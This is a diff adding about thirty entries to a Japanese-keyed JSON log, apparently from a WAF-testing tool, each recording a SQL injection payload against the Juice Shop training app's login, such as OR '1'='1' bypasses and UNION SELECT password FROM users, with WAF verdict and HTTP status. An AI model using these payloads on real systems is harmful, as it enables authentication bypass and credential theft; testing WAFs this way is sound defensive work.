@@ -2581,5 +2581,215 @@
         "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "test@example.com' OR 'a'='a",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "user@domain.com' OR 1=1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' UNION SELECT null, username, password FROM users--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'true'='true",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "test@example.com' OR '1'='1' LIMIT 1--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'x'='x'--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "user@example.com' OR '1'='1'/*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1#",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "test@example.com' OR '1'='1'--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'a'='a",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' LIMIT 1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' UNION SELECT null, null, null, password FROM users --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' ORDER BY 1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'/*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1' -- -",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' UNION SELECT null, null, null--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'a'='a",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 'x'='x",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'<'2",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'>'0",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1 LIMIT 1 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR '1'='1'#",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin@juice-shop.com' OR 1=1/*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
     }
 ]
